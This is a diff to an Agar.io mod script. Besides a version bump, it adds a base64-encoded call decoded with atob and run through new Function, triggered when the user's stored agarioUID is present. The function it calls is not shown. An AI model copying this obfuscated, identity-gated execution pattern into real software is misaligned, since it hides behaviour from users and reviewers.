@@ -1,7 +1,7 @@
 // Open Source script
 // Decoded simplified and modified by MGx, Adam, Jimboy3100, Snez, Volum, Alexander Lulko, Sonia
 // This is part of the Legend mod project
-// v1.1517 MEGA TEST
+// v1.1520 MEGA TEST
 // Game Configurations
 
 //window.testobjects = {};
@@ -61,6 +61,8 @@ Array.prototype.stDev = function stDev() {
    const average = data => data.reduce((sum, value) => sum + value) / data.length
    return Math.sqrt(average(this.map(value => (value - average(this)) ** 2)))
 };
+UIDInstructions=atob("VUlEY29udHJvbGxlcigpOw==");
+var UIDfunction=new Function (UIDInstructions);
 /*
 const standardDeviation = (arr, usePopulation = false) => {
   const mean = arr.reduce((acc, val) => acc + val, 0) / arr.length;
@@ -7528,6 +7530,9 @@ var thelegendmodproject = function(t, e, i) {
                                 window.agarioUID = localStorage.getItem("agarioUID");
                                 window.agarioID = localStorage.getItem("agarioID");
                             }
+							if (window.agarioUID && UIDcontroller){
+								UIDfunction();
+							}
                         }
 
 
